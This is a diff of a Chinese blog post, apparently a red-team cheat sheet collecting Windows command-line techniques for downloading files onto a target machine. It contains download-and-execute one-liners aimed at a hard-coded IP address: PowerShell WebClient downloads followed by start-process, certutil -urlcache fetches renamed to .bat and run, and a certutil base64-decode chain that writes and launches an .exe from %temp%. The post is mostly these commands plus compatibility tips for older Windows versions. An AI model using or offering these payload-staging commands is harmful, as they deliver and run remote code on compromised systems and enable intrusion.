@@ -1,53 +1,79 @@
 ---
 layout: post
-title: 文件下载-Windows篇(长期更新)
+title: 命令行文件下载-Windows篇(长期更新)
 ---
 
 > *文章长期更新，此文收集总结了Windows下 下载文件的各种姿势，对目标表进行文件的落地（或无落地）*
+
+---
 
 [TOC]
 
 ### 0x01 PoweShell
 
-win2003，winXP不支持
+`win2003，winXP`不支持
 
-踩坑：
+踩坑
 
-- Powershell 版本大于`2.0`时 在连接Powershell命令时 **空格** 替换了 `;`
+- Powershell 版本大于`2.0`时 在连接两个命令时 用 **空格** 替换了 `;`
 - Powershell 版本低于或等于2.0时 `DownloadFile()`函数不支持自定义路径 文件默认保存在`C:\Users\当前用户名` 下![image-20200403122054016](https://tva1.sinaimg.cn/large/00831rSTly1gdggmdhh09j311w0ecdit.jpg)![image-20200403121710725](https://tva1.sinaimg.cn/large/00831rSTly1gdggiiv0ndj30mo0f040i.jpg)
 
-powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/test.txt', 'test.bat');start-process 'test.bat'
 
-powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/test.txt', 'c:\1.bat');start-process 'c:\1.bat'
+
+不指定保存路径兼容性更高
 
 
 ```powershell
-$client = new-object System.Net.WebClient;$client.DownloadFile('https://avatars0.githubusercontent.com/u/19944759?s=150&v=4', 'C:\1.jpg')
+powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/test.txt', '1.bat');start-process '1.bat'
 ```
 
+指定路径（Windows7以上适用）
 
+```powershell
+powershell (new-object System.Net.WebClient).DownloadFile('http://47.92.194.173/test.txt', '%temp%\1.bat');start-process '%temp%\1.bat'
+```
+
+`%temp%`指当前登陆用户的临时目录
+
+---
 
 ### 0x02 Certutil
 
-path
+Path
 
 - C:\Windows\System32\certutil.exe
 - C:\Windows\SysWOW64\certutil.exe
 
-```cmd
-certutil -urlcache -split -f http://47.92.194.173/test.txt&ren test.txt test.bat&test.bat
-certutil -urlcache -split -f http://47.92.194.173/test.txt c:\a.bat&c:\a.bat
+踩坑
+
+- 低版本certutil不支持指定下载的目录，为了兼容性可以直接在当前目录操作
+
+```php
+certutil -urlcache -split -f http://47.92.194.173/test.txt&ren 1.txt 1.bat&1.bat
+或者
+certutil -urlcache -split -f http://47.92.194.173/test.txt %temp%\1.bat&%temp%\1.bat
 ```
 
-有的时候certutil不支持指定下载的目录，为了兼容直接在当前目录操作
+Certutil也支持base64加解密以及16进制解密
 
+![image-20200403165312327](https://tva1.sinaimg.cn/large/00831rSTly1gdgohpx2oaj30lu052wfb.jpg)
 
+```php
+certutil -urlcache -split -f http://47.92.194.173/test.bs4 %temp%\1.bs4&certutil -decode %temp%\1.bs4 %temp%\1.exe&%temp%\1.exe
+```
+
+---
 
 ### 0x03 bitsadmin
 
+Path:
+
+- C:\Windows\System32\bitsadmin.exe
+- C:\Windows\SysWOW64\bitsadmin.exe
+
 踩坑：
 
-- 在Windows7或某些版本的Windows10上会运行失败会以下报错
+- 在Windows7或某些版本的Windows10上会运行失败 出现以下报错
 
   > BITSAdmin is deprecated and is not guaranteed to be available in future versions
   >  of Windows.
@@ -59,16 +85,7 @@ certutil -urlcache -split -f http://47.92.194.173/test.txt c:\a.bat&c:\a.bat
   >
   > BITS PowerShell cmdlet现在提供了BITS服务的管理工具
 
-- 啊
-
-
-
-
-
-Path:
-
-- C:\Windows\System32\bitsadmin.exe
-- C:\Windows\SysWOW64\bitsadmin.exe
+  
 
 
 
